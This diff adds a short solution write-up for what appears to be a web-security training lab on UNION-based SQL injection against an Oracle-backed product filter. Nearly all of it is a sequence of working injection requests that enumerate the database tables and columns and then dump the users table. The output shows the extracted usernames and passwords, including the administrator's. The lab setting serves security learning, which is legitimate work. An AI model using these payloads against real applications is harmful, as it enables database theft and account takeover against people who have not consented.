@@ -1,0 +1,28 @@
+This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user.
+
+1.
+GET /filter?category='+union+select+null,null+from+dual-- HTTP/1.1
+
+2.
+GET /filter?category='+union+select+'asdf','test'+from+dual-- HTTP/1.1
+
+3. GET /filter?category='+union+select+table_name,null+from+all_tables-- HTTP/1.1
+
+-> USERS_OBXJBA
+
+4. GET /filter?category='+union+select+column_name,null+from+all_tab_columns-- HTTP/1.1
+GET /filter?category='+union+select+column_name,null+from+all_tab_columns+where+table_name='USERS_OBXJBA'-- HTTP/1.1
+-> PASSWORD_ZNZEWH
+USERNAME_DSHISV
+
+5. GET /filter?category='+union+select+USERNAME_DSHISV,PASSWORD_ZNZEWH+from+USERS_OBXJBA-- HTTP/1.
+-> administrator
+nvygpv19q6bdueixnjp0
+carlos
+hqp9pijswki8wv63pkej
+wiener
+xfqdlbwzfg24wlf04qln
